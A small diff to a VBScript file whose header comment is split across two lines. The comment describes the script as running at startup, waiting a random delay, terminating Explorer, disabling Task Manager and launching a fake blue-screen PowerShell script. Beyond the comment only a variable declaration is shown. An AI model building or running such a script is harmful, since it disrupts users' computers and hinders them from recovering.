@@ -1,4 +1,5 @@
-'This VBScript runs at startup. It waits a random interval (between 1 and 60 minutes), terminates Explorer and disables Task Manager, and then launches the fake BSOD PowerShell script.
+'This VBScript runs at startup. It waits a random interval (between 1 and 60 minutes), 
+'terminates Explorer and disables Task Manager, and then launches the fake BSOD PowerShell script.
 
 ' Create WScript Shell objects for executing system commands
 Dim objShell, WshShell, delay
